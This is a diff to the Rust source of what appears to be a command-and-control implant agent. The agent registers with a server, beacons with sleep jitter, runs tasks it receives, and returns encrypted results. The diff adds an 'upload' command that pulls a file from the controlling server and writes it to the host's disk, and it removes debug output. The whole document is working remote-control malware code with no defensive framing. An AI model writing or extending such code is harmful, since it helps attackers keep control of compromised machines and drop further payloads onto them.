@@ -4,9 +4,10 @@
 use regex::Regex;
 use std::{
     fs,
-    io::Read,
+    io::{Read, Write},
     thread, time
 };
+use url::Url;
 use windows::core::{Error, HSTRING};
 use x25519_dalek::{EphemeralSecret, PublicKey, SharedSecret, StaticSecret};
 
@@ -80,19 +81,15 @@ pub async fn run(config: Config) -> Result<(), Error> {
             random_sleeptime(sleeptime.to_owned(), config.jitter.to_owned())
         );
     
-        // Register agent
         let response = match post(&mut hconnect, "/r".to_owned(), rad_json.to_string()).await {
             Ok(resp) => {
                 registered = true;
                 resp
             }
             Err(e) => {
-                // println!("Error registration: {:?}", e);
                 continue;
             }
         };
-
-        // println!("{}", response);
     }
 
     let plaindata = PlainData::new(agent_name.to_string());
@@ -124,8 +121,6 @@ pub async fn run(config: Config) -> Result<(), Error> {
                 continue;
             }
         };
-
-        // println!("Task: {task}");
 
         // Execute task
         let task_args = match shellwords::split(&task) {
@@ -442,7 +437,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                         Ok(_) => {
                             post_task_result(
                                 &mut hconnect,
-                                "The directory removed successfully.".as_bytes(),
+                                "File removed successfully.".as_bytes(),
                                 agent_name.to_string(),
                                 config.my_secret_key.clone(),
                                 config.server_public_key.clone(),
@@ -464,7 +459,7 @@ pub async fn run(config: Config) -> Result<(), Error> {
                         Ok(_) => {
                             post_task_result(
                                 &mut hconnect,
-                                "The directory removed successfully.".as_bytes(),
+                                "Directory removed successfully.".as_bytes(),
                                 agent_name.to_string(),
                                 config.my_secret_key.clone(),
                                 config.server_public_key.clone(),
@@ -584,6 +579,72 @@ pub async fn run(config: Config) -> Result<(), Error> {
                     config.my_secret_key.clone(),
                     config.server_public_key.clone(),
                 ).await;
+            }
+            "upload" => {
+                let file_to_download = task_args[1].to_string();
+                let mut dest = task_args[2].to_string();
+                // Adjust dest path
+                if dest.as_str() == "." {
+                    dest = file_to_download.split("/").last().unwrap().to_string();
+                }
+
+                let resp_data = match download(
+                    &mut hconnect,
+                    file_to_download.as_bytes(),
+                    agent_name.to_string(),
+                    config.my_secret_key.clone(),
+                    config.server_public_key.clone(),
+                ).await {
+                    Ok(d) => d,
+                    Err(e) => {
+                        post_task_result(
+                            &mut hconnect,
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+
+                        continue;
+                    }
+                };
+
+                let mut f = match fs::File::create(dest) {
+                    Ok(f) => f,
+                    Err(e) => {
+                        post_task_result(
+                            &mut hconnect,
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+
+                        continue;
+                    }
+                };
+
+                match f.write_all(&resp_data) {
+                    Ok(_) => {
+                        post_task_result(
+                            &mut hconnect,
+                            "File uploaded successfully.".as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                    Err(e) => {
+                        post_task_result(
+                            &mut hconnect,
+                            e.to_string().as_bytes(),
+                            agent_name.to_string(),
+                            config.my_secret_key.clone(),
+                            config.server_public_key.clone(),
+                        ).await;
+                    }
+                }
+
             }
             "whoami" => {
                 let username = format!("{}\\{}", whoami::hostname(), whoami::username());
@@ -716,6 +777,24 @@ async fn post_task_result(
     );
     let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
     post(hconnect, "/t/r".to_owned(), cipherdata_json.to_string()).await;
+}
+
+async fn download(
+    hconnect: &mut HConnect,
+    file_to_download: &[u8],
+    agent_name: String,
+    my_secret_key: StaticSecret,
+    server_public_key: PublicKey,
+) -> Result<Vec<u8>, Error> {
+    let cipherdata = CipherData::new(
+        agent_name,
+        file_to_download,
+        my_secret_key,
+        server_public_key,
+    );
+    let cipherdata_json = serde_json::to_string(&cipherdata).unwrap();
+    let resp = post(hconnect, "/t/u".to_owned(), cipherdata_json.to_string()).await.unwrap();
+    Ok(resp.into_bytes())
 }
 
 // fn close_handler(h: &mut HInternet) {
